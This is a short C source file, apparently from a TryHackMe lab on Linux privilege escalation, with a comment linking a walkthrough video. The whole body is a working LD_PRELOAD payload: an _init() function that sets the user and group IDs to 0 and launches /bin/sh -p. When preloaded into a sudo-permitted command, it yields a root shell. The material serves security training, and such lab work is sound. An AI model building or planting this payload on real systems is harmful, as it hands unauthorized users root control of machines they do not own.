/* 
Script used on tryhackme room Linux Privilege Escalation: Automation Build on Linux privilege escalation skills: automate enumeration and use public exploits.
LD_PRELOAD with sudo
YouTube video full walk through: https://youtu.be/BMo4iDN57ko

*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    setuid(0);
    setgid(0);
    char *args[] = {"/bin/sh", "-p", NULL};
    execve("/bin/sh", args, NULL);   
}
